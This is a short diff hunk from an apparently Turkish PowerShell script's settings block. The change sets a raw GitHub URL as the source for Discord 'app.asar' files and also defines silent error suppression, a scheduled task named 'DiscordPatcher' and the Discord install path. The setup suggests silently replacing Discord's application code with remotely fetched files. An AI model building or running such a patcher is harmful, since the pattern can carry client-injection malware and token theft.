@@ -5,7 +5,7 @@
 $ErrorActionPreference = "SilentlyContinue"
 
 # ===================== AYARLAR =====================
-$BaseUrl      = "https://raw.githubusercontent.com/KULLANICI/REPO/main"
+$BaseUrl      = "https://raw.githubusercontent.com/ardayimben/autoupdatebullshit/main"
 $Files        = @("app.asar", "_app.asar")
 $TaskName     = "DiscordPatcher"
 $DiscordRoot  = "$env:LOCALAPPDATA\Discord"
